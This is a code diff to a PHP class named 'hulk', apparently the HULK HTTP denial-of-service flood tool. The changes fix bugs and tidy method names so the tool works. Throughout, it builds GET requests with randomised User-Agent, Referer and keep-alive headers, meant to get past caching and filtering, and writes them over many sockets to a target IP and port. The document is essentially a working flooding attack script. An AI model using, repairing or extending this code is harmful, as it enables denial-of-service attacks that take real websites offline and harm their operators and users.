@@ -1,11 +1,10 @@
 <?php
-include_once "../header.php";
 class hulk{
-	public $ip;
-	public $port;
-	public $timedout;
-	public $socketn;
-	public $max_time;
+	private $ip;
+	private $port;
+	private $timedout;
+	private $socketn;
+	private $max_time;
 	public function __construct($ip, $port, $timedout, $socketn, $max_time) {
 		$this->ip = $ip;
 		$this->port = $port;
@@ -13,8 +12,8 @@ class hulk{
 		$this->socketn = $socketn;
 		$this->max_time = $max_time;
 	}
-	private function randomuseragent(){
-		$armetomb=array(
+	private function randomUserAgent(){
+		$User_Agents=array(
 		"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1",
 		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
 		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
@@ -63,19 +62,19 @@ class hulk{
 		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.5 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.4",
 		"Mozilla/5.0 (Windows NT 6.0; rv:13.0) Gecko/20100101 Firefox/13.0.1",
 		"Mozilla/5.0 (Windows NT 6.0; rv:13.0) Gecko/20100101 Firefox/13.0.1");
-		return $armetomb[rand(0, sizeof($armetomb)];
+		return $User_Agents[rand(0, sizeof($User_Agents)-1)];
 	}
-	private function referer_list(){
+	private function refererList(){
 		$refarray=array("http://www.google.com/?q=",
-            "http://www.usatoday.com/search/results?q=",
-            "http://engadget.search.aol.com/search?q=",
-            "http://" . $this->ip . "/");
-		return $refarray[rand(0, sizeof($refarray)];
+	        "http://www.usatoday.com/search/results?q=",
+	        "http://engadget.search.aol.com/search?q=",
+	       	"http://" . $this->ip . "/");
+		return $refarray[rand(0, sizeof($refarray)-1)];
 	}
 	private function RandomString($size){
     	$characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
     	$randstring = '';
-    	for ($i = 0; $i < $size; $i++) {
+    	for ($r = 0; $r < $size; $r++) {
         	$randstring.= $characters[rand(0, strlen($characters))];
     	}
     	return $randstring;
@@ -93,10 +92,10 @@ class hulk{
 				$out.="Host: ".$this->ip."\r\n";
 				$out.="Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n";
 				$out.="Cache-Control: no-cache\r\n";
-				$out.="Referer: ".referer_list().RandomString(rand(0, 5))."\r\n";
+				$out.="Referer: ".$this->refererList().$this->RandomString(rand(1, 6))."\r\n";
 				$out.="Keep-Alive: ".rand(110, 120)."\r\n";
 				$out.= "Connection: keep-alive\r\n";
-				$out.="User-Agent: ".randomuseragent()."\r\n";
+				$out.="User-Agent: ".$this->randomUserAgent()."\r\n";
 				$out.= "\r\n";
 				$packet++;
 				fwrite($fp[$i],$out);
